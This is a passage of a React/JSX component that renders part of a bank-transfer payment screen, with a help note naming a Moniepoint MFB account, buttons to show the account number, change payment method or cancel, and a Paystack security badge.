                    className="w-full py-3 border border-[#dcdcdc] rounded-[4px] bg-white text-[#222222] text-[13.5px] font-medium hover:bg-gray-50 active:bg-gray-100 transition-colors cursor-pointer"
                  >
                    Get help
                  </button>

                  {showHelpNote && (
                    <div className="mt-3 p-3 rounded-[4px] bg-[#f8f9fa] border border-[#e5e7eb] text-[12px] text-[#555555] text-center">
                      <p>
                        Transfers are typically confirmed within a few minutes. If your bank has
                        debited you, please wait while we verify your transfer to Moniepoint MFB
                        (6725375556).
                      </p>
                    </div>
                  )}

                  {/* Show account number link */}
                  <div className="mt-4 text-center">
                    <button
                      type="button"
                      onClick={() => setTransferStep('details')}
                      className="text-[12.5px] text-[#777777] hover:text-[#222222] transition-colors cursor-pointer"
                    >
                      Show account number
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Bottom Method Footer: Change Payment Method & Cancel Payment */}
            <div className="border-t border-[#efefef] pt-5 pb-10 bg-white">
              <div className="flex items-center justify-center gap-3 px-4">
                <button
                  type="button"
                  onClick={handleChangePaymentMethod}
                  className="border border-[#dcdfe6] rounded-[4px] px-3.5 py-2 text-[12.5px] text-[#4a5568] bg-white hover:bg-gray-50 active:bg-[#d8dce2] flex items-center gap-1.5 shadow-[0_1px_2px_rgba(0,0,0,0.02)] transition-colors cursor-pointer whitespace-nowrap"
                >
                  <svg width="12" height="12" viewBox="0 0 16 16" fill="none">
                    <path
                      d="M4 6L2 8L4 10M12 6L14 8L12 10"
                      stroke="#718096"
                      strokeWidth="1.4"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                  <span>Change Payment Method</span>
                </button>

                <button
                  type="button"
                  onClick={handleCancelPayment}
                  className="border border-[#dcdfe6] rounded-[4px] px-3.5 py-2 text-[12.5px] text-[#4a5568] bg-white hover:bg-gray-50 active:bg-[#d8dce2] flex items-center gap-1.5 shadow-[0_1px_2px_rgba(0,0,0,0.02)] transition-colors cursor-pointer whitespace-nowrap"
                >
                  <X className="w-3.5 h-3.5 text-[#718096]" />
                  <span>Cancel Payment</span>
                </button>
              </div>

              <div className="mt-6">
                <SecuredByPaystack />
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
